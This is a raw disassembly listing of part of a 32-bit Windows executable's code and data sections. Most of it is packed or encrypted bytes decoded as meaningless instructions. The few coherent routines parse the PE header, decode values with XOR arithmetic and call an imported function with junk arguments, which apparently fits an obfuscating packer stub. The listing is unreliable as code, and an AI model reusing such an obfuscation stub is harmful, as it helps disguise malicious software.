  411322:	jle    0x4112b9
  411324:	pop    esi
  411325:	xor    eax,0x47ea29bc
  41132a:	pop    ds
  41132b:	shl    edi,1
  41132d:	(bad)  
  41132e:	adc    BYTE PTR [ebx],dh
  411330:	loopne 0x411381
  411332:	int3   
  411333:	push   ss
  411334:	(bad)  
  411335:	jmp    0x4112e3
  411337:	(bad)  
  411338:	or     BYTE PTR [edx],dh
  41133a:	sahf   
  41133b:	stos   BYTE PTR es:[edi],al
  41133c:	add    BYTE PTR [ebx-0x58c60128],0x1f
  411343:	dec    ebp
  411344:	cmp    DWORD PTR [ecx],0xffffff80
  411347:	hlt    
  411348:	(bad)  
  411349:	xor    al,0x7a
  41134b:	mov    cl,0xcb
  41134d:	loope  0x411377
  41134f:	xchg   DWORD PTR [eax-0x2a],esi
  411352:	std    
  411353:	imul   ebx,DWORD PTR [edi],0xffffffc5
  411356:	in     al,0x39
  411358:	pop    ds
  411359:	hlt    
  41135a:	call   0xbea33cdf
  41135f:	(bad)  
  411360:	push   ecx
  411361:	adc    DWORD PTR [esi+esi*4-0x43347757],0xfffffff0
  411369:	sub    BYTE PTR [ebp+0x5f5c5e8],dh
  41136f:	inc    ebx
  411370:	dec    eax
  411371:	mov    al,0x5a
  411373:	jle    0x411397
  411375:	sbb    DWORD PTR [edx],0xb700bd4d
  41137b:	mov    eax,ds:0xcc1e3cf1
  411380:	or     dl,BYTE PTR [ebx+0x46]
  411383:	pop    ecx
  411384:	fnstsw WORD PTR [ebx+0x7c33012d]
  41138a:	lahf   
  41138b:	push   0xfffffff9
  41138d:	(bad)  
  41138e:	jmp    0x67af:0xd866521d
  411395:	xchg   esp,ecx
  411397:	push   cs
  411398:	jns    0x41131b
  41139a:	shr    BYTE PTR [ebx],1
  41139c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41139e:	lock cmp BYTE PTR [edi-0x36],dl
  4113a2:	enter  0x1e14,0xb2
  4113a6:	push   es
  4113a7:	cs sub eax,0x1936bd58
  4113ad:	ret    
  4113ae:	test   ah,al
  4113b0:	push   ebx
  4113b1:	mov    ebp,DWORD PTR [ebx+0x38932b7e]
  4113b7:	leave  
  4113b8:	outs   dx,BYTE PTR ds:[esi]
  4113b9:	or     al,0x15
  4113bb:	(bad)  
  4113bc:	out    dx,al
  4113bd:	or     ah,BYTE PTR [ebx+0x6d]
  4113c0:	stc    
  4113c1:	xchg   BYTE PTR fs:[ecx-0x6921ee3c],al
  4113c8:	lea    edi,[edi+edx*8]
  4113cb:	arpl   WORD PTR [edx+eax*1],dx
  4113ce:	inc    ebp
  4113cf:	xchg   esp,eax
  4113d0:	iret   
  4113d1:	ja     0x41144f
  4113d3:	fucom  st(5)
  4113d5:	test   cl,ch
  4113d7:	aam    0x7
  4113d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113da:	or     ch,bh
  4113dc:	loope  0x4113e8
  4113de:	inc    esp
  4113df:	inc    ecx
  4113e0:	fmul   st(3),st
  4113e2:	add    eax,0x5e9f0e3d
  4113e7:	imul   ebp,ebx,0x8505c8a5
  4113ed:	pop    esp
  4113ee:	fwait
  4113ef:	dec    edi
  4113f0:	sub    DWORD PTR [edx-0x21],edx
  4113f3:	pop    edx
  4113f4:	loopne 0x4113f7
  4113f6:	or     al,0x14
  4113f8:	ds hlt 
  4113fa:	cmp    al,0xb0
  4113fc:	retf   
  4113fd:	push   eax
  4113fe:	adc    eax,0x63a3d266
  411403:	ja     0x4113e1
  411405:	call   0x4683:0x6d0e08df
  41140c:	jecxz  0x4113bd
  41140e:	and    DWORD PTR ds:0x505d2988,ebx
  411414:	cvtps2pi mm5,QWORD PTR [ebp+0x498f2798]
  41141b:	out    dx,al
  41141c:	outs   dx,DWORD PTR ds:[esi]
  41141d:	mov    DWORD PTR [edx+0x23],edi
  411420:	cmp    dh,0xaf
  411423:	inc    esi
  411424:	add    al,0x3c
  411426:	not    BYTE PTR [ecx+0xc5f03b]
  41142c:	into   
  41142d:	cmp    al,0xb1
  41142f:	inc    ebp
  411430:	adc    DWORD PTR [ebp+0x3b],edi
  411433:	push   es
  411434:	sub    ch,al
  411436:	int    0x9b
  411438:	int    0x75
  41143a:	xchg   edx,eax
  41143b:	les    esp,FWORD PTR [edi]
  41143d:	repnz mul DWORD PTR [edi+0x58]
  411441:	or     al,0xe4
  411443:	push   edx
  411444:	xor    al,BYTE PTR [ecx-0x55]
  411447:	jno    0x411403
  411449:	jl     0x411447
  41144b:	leave  
  41144c:	out    dx,al
  41144d:	div    BYTE PTR [edx+ebx*4-0x5]
  411451:	adc    ebp,DWORD PTR [esi-0x3f1352c9]
  411457:	jae    0x41140d
  411459:	jge    0x411464
  41145b:	(bad)  
  41145c:	in     al,0x97
  41145e:	scas   eax,DWORD PTR es:[edi]
  41145f:	jno    0x41142d
  411461:	push   esp
  411462:	mov    eax,ds:0xc399d695
  411467:	(bad)  
  411468:	scas   al,BYTE PTR es:[edi]
  411469:	pop    ss
  41146a:	int    0xee
  41146c:	add    ah,dl
  41146e:	lea    esp,[eax-0xf383a9d]
  411474:	sub    edi,DWORD PTR [ebp+0x1a]
  411477:	xor    esi,eax
  411479:	push   ebp
  41147a:	lahf   
  41147b:	test   eax,0x7b134df8
  411480:	outs   dx,DWORD PTR ds:[esi]
  411481:	jno    0x411483
  411483:	xchg   edx,eax
  411485:	mov    ecx,0x87450d01
  41148a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148b:	fisub  DWORD PTR [esi]
  41148d:	adc    DWORD PTR ds:0xd79ef8f5,ecx
  411493:	(bad)  
  411494:	pop    eax
  411495:	xor    BYTE PTR [esp+ecx*1-0x355bb700],0x9b
  41149d:	xchg   DWORD PTR [eax+0x5179f7e7],ebx
  4114a3:	adc    dl,BYTE PTR [eax]
  4114a5:	mov    ds:0xd6e3e5ec,eax
  4114aa:	retf   
  4114ab:	bound  edi,QWORD PTR [ecx+0x23652278]
  4114b1:	jp     0x411510
  4114b3:	dec    eax
  4114b4:	call   esi
  4114b6:	in     al,0x10
  4114b8:	call   0x2c4:0xf450349f
  4114bf:	scas   al,BYTE PTR es:[edi]
  4114c0:	popa   
  4114c1:	dec    edi
  4114c2:	loopne 0x411468
  4114c4:	mov    WORD PTR [ebp-0x2985ccba],ds
  4114ca:	leave  
  4114cb:	adc    al,0xab
  4114cd:	mov    DWORD PTR [eax+edi*8],ecx
  4114d0:	pop    eax
  4114d1:	xchg   ecx,eax
  4114d2:	daa    
  4114d3:	lahf   
  4114d4:	push   ebx
  4114d5:	push   ebx
  4114d6:	xchg   esp,eax
  4114d7:	or     al,0x7d
  4114d9:	jge    0x41152a
  4114db:	ffreep st(3)
  4114dd:	mov    esp,0x1bf37652
  4114e2:	outs   dx,DWORD PTR ds:[esi]
  4114e3:	test   eax,0x35494025
  4114e8:	scas   eax,DWORD PTR es:[edi]
  4114e9:	add    eax,0x1f726d24
  4114ee:	mov    al,0x85
  4114f0:	mov    WORD PTR [edi+0x14c1ab80],gs
  4114f6:	push   esi
  4114f7:	push   es
  4114f8:	mov    edx,0x377ae45d
  4114fd:	icebp  
  4114fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ff:	cs xchg esi,eax
  411501:	popf   
  411502:	fxch   st(1)
  411504:	jmp    0x5f4c:0xbf08e915
  41150b:	iret   
  41150c:	ret    0x354e
  41150f:	mov    ecx,0x178b2da9
  411514:	mov    DWORD PTR [esp+edx*4],ebp
  411517:	adc    edx,esi
  411519:	push   ds
  41151a:	hlt    
  41151b:	mov    cl,0xb0
  41151d:	mov    esp,0x691fec58
  411522:	and    BYTE PTR [ecx+0x32],0xcc
  411526:	aaa    
  411527:	adc    DWORD PTR [edi+ebp*2+0x6dd349f6],esp
  41152e:	cmc    
  41152f:	and    DWORD PTR [esi],ebx
  411531:	xchg   esi,eax
  411532:	imul   ecx,DWORD PTR [ebx+0x75],0xef4375de
  411539:	or     eax,0x38cf5e0
  41153e:	add    esp,DWORD PTR [edx-0x48]
  411541:	inc    edx
  411542:	inc    ecx
  411543:	aaa    
  411544:	and    BYTE PTR [ebp-0x210eccba],al
  41154a:	sti    
  41154b:	cmp    al,0xcf
  41154d:	inc    esi
  41154e:	stos   BYTE PTR es:[edi],al
  41154f:	adc    eax,0x8230ef11
  411554:	sbb    eax,0x84b209b7
  411559:	mov    al,0xf0
  41155b:	mov    ch,0x6f
  41155d:	xchg   edi,eax
  41155e:	scas   eax,DWORD PTR es:[edi]
  41155f:	fcmovbe st,st(7)
  411561:	sub    DWORD PTR [ebp+ebp*8-0x23],esp
  411565:	or     dl,BYTE PTR [ebx-0x66]
  411568:	les    esp,FWORD PTR [edx]
  41156a:	push   cs
  41156b:	shr    DWORD PTR [ecx],cl
  41156d:	sbb    ah,ah
  41156f:	xchg   DWORD PTR [esp+ebp*8],eax
  411572:	shr    ah,0x29
  411575:	sbb    BYTE PTR [ebp+0x77ed6bf3],cl
  41157b:	cmp    al,0xb6
  41157d:	sub    eax,0xf6328fcd
  411582:	push   esi
  411583:	cmp    al,0x97
  411585:	jno    0x4115a0
  411587:	mov    ?,WORD PTR [ebx+eiz*1]
  41158a:	es pop ds
  41158c:	cld    
  41158d:	cmp    BYTE PTR [ebp-0x2d],0xfe
  411591:	mov    edi,0xd026d934
  411596:	or     al,0x1d
  411598:	add    ecx,ebx
  41159a:	dec    edi
  41159b:	ret    
  41159c:	arpl   WORD PTR [ebp+0x75],dx
  41159f:	ret    
  4115a0:	cmp    bh,BYTE PTR [ebx-0x444b21f2]
  4115a6:	dec    ebp
  4115a7:	cmp    edi,eax
  4115a9:	retf   
  4115aa:	iret   
  4115ab:	(bad)  
  4115ac:	clc    
  4115ad:	inc    edi
  4115ae:	mov    WORD PTR [eax+0x52bce921],ds
  4115b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115b5:	mov    cl,0xd2
  4115b7:	jae    0x411588
  4115b9:	out    dx,eax
  4115ba:	add    al,0xf6
  4115bc:	js     0x4115e0
  4115be:	js     0x411553
  4115c0:	pop    esp
  4115c1:	mov    al,0x78
  4115c3:	push   eax
  4115c4:	ret    0xef31
  4115c7:	push   edx
  4115c8:	mov    ds:0xf695b115,al
  4115cd:	test   DWORD PTR [ebx-0x37],ebx
  4115d0:	lahf   
  4115d1:	mov    ah,0x92
  4115d3:	out    dx,eax
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	or     DWORD PTR [edi],ebx
  41161a:	leave  
  41161b:	xrelease xchg BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x411628
  411625:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411627:	dec    ebx
  411628:	out    dx,al
  411629:	sub    BYTE PTR [ecx-0x34],al
  41162c:	xor    BYTE PTR [edi+ecx*4-0x36],bl
  411630:	dec    ebx
  411631:	cdq    
  411632:	(bad)  
  411633:	pusha  
  411634:	dec    edi
  411635:	inc    ebp
  411636:	rol    BYTE PTR [ecx+0x21db3ea3],0xdf
  41163d:	(bad)  
  41163e:	leave  
  41163f:	mov    eax,0xe3a96a9e
  411644:	imul   ebp,DWORD PTR [ebp-0x5a],0xf9ad36fd
  41164b:	imul   ecx,DWORD PTR [edi+0x5a246eef],0x709bac1a
  411655:	sbb    eax,DWORD PTR [ebx-0x56]
  411658:	aaa    
  411659:	popa   
  41165a:	test   al,0x81
  41165c:	daa    
  41165d:	jae    0x4115e9
  41165f:	inc    ebp
  411660:	mov    edx,0x83f1f8f3
  411665:	(bad)  
  411666:	sub    dl,BYTE PTR [ebx+0x4e3ca261]
  41166c:	inc    edi
  41166d:	mov    ah,0x4
  41166f:	idiv   DWORD PTR [eax-0x5b]
  411672:	rcl    cl,0x6a
  411675:	sub    edi,DWORD PTR [eax-0x2f]
  411678:	aaa    
  411679:	mov    esp,0xe3dd168c
  41167e:	(bad)  
  411680:	fcomp  DWORD PTR es:[ecx+ebp*8+0x1882ede3]
  411688:	call   0x7296c527
  41168d:	jge    0x411664
  41168f:	shl    edi,0xfe
  411692:	sbb    DWORD PTR [esi-0x6f23c635],0xffffffcf
  411699:	adc    DWORD PTR [esi],eax
  41169b:	xor    al,0x58
  41169d:	jmp    0x41162e
  41169f:	pop    ds
  4116a0:	xchg   ecx,eax
  4116a1:	bound  esp,QWORD PTR [edi]
  4116a3:	test   eax,0xf79ef336
  4116a8:	sub    eax,0x2a25c50b
  4116ad:	dec    edx
  4116ae:	push   0x69
  4116b0:	add    BYTE PTR [ecx+0x73d2f765],ch
  4116b6:	stos   BYTE PTR es:[edi],al
  4116b7:	data16 addr16 jg 0x411646
  4116bb:	aam    0xce
  4116bd:	jmp    0x215d:0x5a37f8fd
  4116c4:	push   ds
  4116c5:	ret    0x75cc
  4116c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c9:	push   ds
  4116ca:	addr16 aad 0xda
  4116cd:	inc    esp
  4116ce:	les    esi,FWORD PTR [edx+0x1f77a3d6]
  4116d4:	std    
  4116d5:	mov    esi,0xc15f760f
  4116da:	and    al,0x40
  4116dc:	push   esi
  4116dd:	mov    dl,0xcd
  4116df:	dec    esp
  4116e0:	(bad)  
  4116e1:	dec    edi
  4116e2:	push   0xffffffed
  4116e4:	in     al,dx
  4116e5:	and    DWORD PTR [edx-0x61ad5760],edi
  4116eb:	jp     0x41170d
  4116ed:	cmp    eax,0x6527b1ad
  4116f2:	std    
  4116f3:	jmp    0xcaec2131
  4116f8:	into   
  4116f9:	scas   eax,DWORD PTR es:[edi]
  4116fa:	iret   
  4116fb:	cmp    dl,BYTE PTR [ecx+edi*8+0x251b34ff]
  411702:	sar    BYTE PTR [ecx+0x22],cl
  411705:	push   ss
  411706:	push   ebx
  411707:	sub    BYTE PTR [edx],ch
  411709:	ret    
  41170a:	jo     0x411718
  41170c:	or     bh,BYTE PTR [ebp+0x8]
  41170f:	cmc    
  411710:	imul   edx,DWORD PTR [eax-0x1a],0xb095aa51
  411717:	js     0x411707
  411719:	jo     0x4116d3
  41171b:	mov    bh,0xa4
  41171d:	addr16 cmc 
  41171f:	push   ss
  411720:	ja     0x4116d6
  411722:	sbb    cl,ah
  411724:	es jo  0x4116ef
  411727:	mov    bh,0x77
  411729:	xor    DWORD PTR [ebp-0x1d],edx
  41172c:	push   eax
  41172d:	gs pop ss
  41172f:	sub    dh,BYTE PTR [ebp+0x13]
  411732:	mov    dh,0x7
  411734:	push   eax
  411735:	xchg   esp,eax
  411736:	mov    ds:0x2c4810e4,al
  41173b:	lock gs jp 0x6125145e
  411743:	clc    
  411744:	or     BYTE PTR [eax],dl
  411746:	push   ss
  411747:	pop    esi
  411748:	or     BYTE PTR [ebx+edi*8-0x3208fb19],bl
  41174f:	mov    ecx,?
  411751:	in     al,0x4b
  411753:	mov    edi,DWORD PTR [edx+0x3c]
  411756:	jge    0x411752
  411758:	(bad)  
  411759:	iret   
  41175a:	les    edi,FWORD PTR [edx+0x65]
  41175d:	leave  
  41175e:	mov    bh,0x44
  411760:	lahf   
  411761:	mov    ebp,0x2c985a68
  411766:	inc    edi
  411767:	stos   DWORD PTR es:[edi],eax
  411768:	push   eax
  411769:	mov    BYTE PTR [ecx+0x3bedc927],cl
  41176f:	cwde   
  411770:	(bad)  
  411771:	loopne 0x4116f5
  411773:	mov    ebp,0x700e890c
  411778:	outs   dx,DWORD PTR ds:[esi]
  411779:	xor    BYTE PTR [edi-0x61],ah
  41177c:	jmp    FWORD PTR [esi+0x359dc843]
  411782:	ds xchg ebx,eax
  411784:	in     eax,dx
  411785:	mov    esp,0xc79d89a3
  41178a:	mov    cl,0xef
  41178c:	add    al,0x88
  41178e:	mov    ah,al
  411790:	inc    esi
  411791:	pop    ebp
  411792:	fwait
  411793:	jae    0x4117db
  411795:	scas   al,BYTE PTR es:[edi]
  411796:	mov    ds:0xefe23561,eax
  41179b:	mov    ebp,0x54bcd2c
  4117a0:	out    dx,al
  4117a1:	dec    edi
  4117a2:	scas   al,BYTE PTR es:[edi]
  4117a3:	xor    BYTE PTR [edx-0x3e1950fc],al
  4117a9:	push   0x9d779cdd
  4117ae:	enter  0x4666,0x75
  4117b2:	jl     0x411801
  4117b4:	mov    DWORD PTR [ebx-0x30cb2fcf],0x60d58d10
  4117be:	cmp    al,0x28
  4117c0:	xor    DWORD PTR [ecx],edx
  4117c2:	aas    
  4117c3:	adc    esp,DWORD PTR [edx+eiz*1-0x21]
  4117c7:	dec    esp
  4117c8:	sub    eax,0xa3ab557e
  4117cd:	mov    edi,0xc708458b
  4117d2:	add    eax,0x4336a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4335ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	xchg   esi,eax
  4118e8:	outs   dx,BYTE PTR ds:[esi]
  4118e9:	iret   
  4118ea:	sbb    ebp,DWORD PTR [esi+ecx*2]
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41192a
  4118f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f5:	add    DWORD PTR [ebx+eiz*4-0x2b],eax
  4118f9:	sbb    eax,0x60899868
  4118fe:	mov    bh,0x42
  411900:	int    0x28
  411902:	or     BYTE PTR [eax-0x6ecea765],dh
  411908:	add    eax,0xf96b62cd
  41190d:	inc    ebx
  41190e:	leave  
  41190f:	addr16 mov bl,0xae
  411912:	jecxz  0x4118b4
  411914:	fnstcw WORD PTR [edx]
  411916:	and    BYTE PTR [ebx+0x79102de2],0xb5
  41191d:	fsub   DWORD PTR [edx+0x24]
  411920:	int3   
  411921:	or     al,0x8e
  411923:	jo     0x41193a
  411925:	lock (bad) 
  411927:	jb     0x411982
  411929:	add    cl,BYTE PTR [ecx]
  41192b:	(bad)  
  41192c:	xchg   edx,eax
  41192d:	jp     0x411915
  41192f:	(bad)
  411932:	xor    ah,dh
  411934:	xor    eax,0xf3e3c893
  411939:	push   ds
  41193a:	sub    ecx,ebp
  41193c:	add    DWORD PTR [ecx+0xc],edi
  41193f:	pushf  
  411940:	cmc    
  411941:	and    DWORD PTR [ebp+0x59],eax
  411944:	push   ss
  411945:	aad    0x41
  411947:	pop    edi
  411948:	icebp  
  411949:	jnp    0x4118d0
  41194b:	std    
  41194c:	xchg   ebp,eax
  41194d:	sub    al,0x7b
  41194f:	mov    WORD PTR [edi*4+0x1b9615d7],gs
  411956:	mov    ebx,0xe388a623
  41195b:	jge    0x4119d9
  41195d:	retf   0xccdb
  411960:	mov    edi,DWORD PTR [ebx-0x7bb7e12]
  411966:	jnp    0x4118f3
  411968:	and    DWORD PTR [ebx],0xb458a823
  41196e:	ja     0x41198b
  411970:	shr    ebx,1
  411972:	test   DWORD PTR [ebx-0x41e28035],esi
  411978:	dec    ecx
  411979:	(bad)  
  41197a:	dec    ebp
  41197b:	sbb    dh,BYTE PTR [edi-0x244c293d]
  411981:	pop    esi
  411982:	cmp    ch,al
  411984:	jns    0x4119c4
  411986:	push   cs
  411987:	push   ebx
  411988:	cmc    
  411989:	sti    
  41198a:	int3   
  41198b:	jl     0x4119b7
  41198d:	push   ebp
  41198e:	sub    eax,0xc7cf110f
  411993:	pop    ds
  411994:	inc    edx
  411995:	leave  
  411996:	iret   
  411997:	rol    eax,1
  411999:	rcr    DWORD PTR [edi-0x6249a0a],cl
  41199f:	and    BYTE PTR [edi+0x63eb0044],dh
  4119a5:	fcmovne st,st(6)
  4119a7:	mov    bh,bh
  4119a9:	and    al,0x56
  4119ab:	fsub   DWORD PTR [ecx]
  4119ad:	test   eax,0xab508f61
  4119b2:	mov    dl,0xb9
  4119b4:	pop    edx
  4119b5:	ins    BYTE PTR es:[edi],dx
  4119b6:	or     ebp,DWORD PTR [ebx+0x3f57e329]
  4119bc:	mov    al,ds:0xcc4d685b
  4119c1:	jmp    DWORD PTR [esi+0x47d9f9c5]
  4119c7:	cmp    al,0x99
  4119c9:	pop    esp
  4119ca:	mov    bh,0x5d
  4119cc:	inc    ebx
  4119cd:	daa    
  4119ce:	xchg   ebx,ebx
  4119d0:	pop    ss
  4119d1:	sbb    DWORD PTR [esi+0x4c],0xffffff95
  4119d5:	push   edx
  4119d6:	xor    al,0xc7
  4119d8:	lds    ecx,FWORD PTR [eax+0x54f4c854]
  4119de:	adc    ch,ch
  4119e0:	sub    esp,DWORD PTR [ebp+0x2]
  4119e3:	ret    
  4119e4:	and    al,0x25
  4119e6:	mov    esi,0x8bce0086
  4119eb:	orps   xmm0,XMMWORD PTR [edi]
  4119ee:	int3   
  4119ef:	lea    edx,[ebp+0x38]
  4119f2:	inc    ebx
  4119f3:	ins    BYTE PTR es:[edi],dx
  4119f4:	xchg   esi,eax
  4119f5:	mov    ch,0x67
  4119f7:	add    BYTE PTR [ecx+0x3f4c27af],ch
  4119fd:	mov    ebx,0xb1828e50
  411a02:	jmp    0x9d05:0x7fbd6dd2
  411a09:	fwait
  411a0a:	dec    edx
  411a0b:	ds adc bh,al
  411a0e:	loopne 0x411a72
  411a10:	and    esp,esp
  411a12:	jns    0x41199e
  411a14:	mov    bl,0xae
  411a16:	cld    
  411a17:	push   cs
  411a18:	scas   al,BYTE PTR es:[edi]
  411a19:	sbb    eax,0x278bbb8c
  411a1e:	and    ch,cl
  411a20:	lods   eax,DWORD PTR ds:[esi]
  411a21:	mov    dl,0x99
  411a23:	pusha  
  411a24:	call   0xffb79347
  411a29:	jne    0x4119fd
  411a2b:	add    bh,ch
  411a2d:	mov    edi,gs
  411a2f:	(bad)  
  411a30:	shl    BYTE PTR [ebx-0x80],cl
  411a33:	xchg   esi,eax
  411a34:	jo     0x411a6f
  411a36:	sahf   
  411a37:	push   eax
  411a38:	add    DWORD PTR [esi-0x5b],0x79
  411a3c:	mov    esp,0xf6b72929
  411a41:	mov    al,0x2
  411a43:	pop    es
  411a44:	jle    0x411a20
  411a46:	mov    ebp,0x7b273a03
  411a4b:	mov    ecx,?
  411a4d:	into   
  411a4e:	lahf   
  411a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a50:	xor    DWORD PTR [esi-0x193b7534],0xffcefa8
  411a5a:	sahf   
  411a5b:	loopne 0x411a55
  411a5d:	sub    ch,BYTE PTR [ecx+0x43]
  411a60:	aas    
  411a61:	sbb    ebx,DWORD PTR [ecx+0x2bb27659]
  411a67:	mov    DWORD PTR [eax+0x17a02f2f],ebx
  411a6d:	repnz inc ebp
  411a6f:	stos   DWORD PTR es:[edi],eax
  411a70:	jb     0x4119fa
  411a72:	test   BYTE PTR [ebx+0x1a],cl
  411a75:	cmp    edi,DWORD PTR [edx]
  411a77:	clc    
  411a78:	pop    ss
  411a79:	scas   al,BYTE PTR es:[edi]
  411a7a:	(bad)  
  411a7b:	adc    eax,0x616890f5
  411a80:	div    BYTE PTR ds:0xcfeaaa21
  411a86:	jg     0x411a14
  411a88:	push   eax
  411a89:	cdq    
  411a8a:	fdiv   st(7),st
  411a8c:	mov    es,WORD PTR [ebp-0x5267a1c5]
  411a92:	stos   BYTE PTR es:[edi],al
  411a93:	dec    eax
  411a94:	cmp    DWORD PTR [ebx-0x74fb65d3],0x3c2a0fa
  411a9e:	shr    ecx,0xd
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
